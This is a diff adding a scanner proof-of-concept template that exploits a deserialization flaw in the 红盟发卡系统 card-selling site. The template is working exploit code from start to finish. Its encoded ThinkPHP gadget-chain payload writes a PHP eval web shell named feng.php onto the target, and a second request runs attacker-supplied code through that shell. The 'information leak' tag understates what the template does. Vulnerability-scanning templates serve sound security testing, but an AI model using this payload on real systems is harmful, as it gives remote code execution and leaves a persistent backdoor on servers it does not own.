@@ -1,0 +1,40 @@
+id: poc-yaml-hm-faka-ordercontent-unserialize-rce
+info:
+  name: 红盟发卡系统 order/orderContent 反序列化漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 信息泄露
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        POST /shop/order/orderContent?order_no=123 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        search_content=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTE6IgAqAGJpbmRBdHRyIjthOjI6e2k6MDtzOjI6Im5vIjtpOjE7czozOiIxMjMiO31zOjE1OiIAKgBzZWxmUmVsYXRpb24iO2I6MDtzOjg6IgAqAHF1ZXJ5IjtPOjE0OiJ0aGlua1xkYlxRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086Mjk6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjEyOToicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWFhYVBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd5ZG1aVzVuSjEwcE96OCtJQT09Ly4uL2ZlbmcucGhwIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtiOjE7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjI5OiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZSI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czoxMjk6InBocDovL2ZpbHRlci9jb252ZXJ0Lmljb252LnV0Zi04LnV0Zi03fGNvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1hYWFQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXeWRtWlc1bkoxMHBPejgrSUE9PS8uLi9mZW5nLnBocCI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7YjoxO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czo4OiIAKgBxdWVyeSI7TzoxNDoiVGhpbmtcZFhRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086Mjk6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjEyOToicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWFhYVBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd5ZG1aVzVuSjEwcE96OCtJQT09Ly4uL2ZlbmcucGhwIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtiOjE7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [500]
+      - type: word
+        words:
+          - "System Error"
+        part: title
+  - raw:
+      - |
+        POST /feng.php3b58a9545013e88c7186db11bb158c44.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        feng=echo%20md5({{t1}});
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
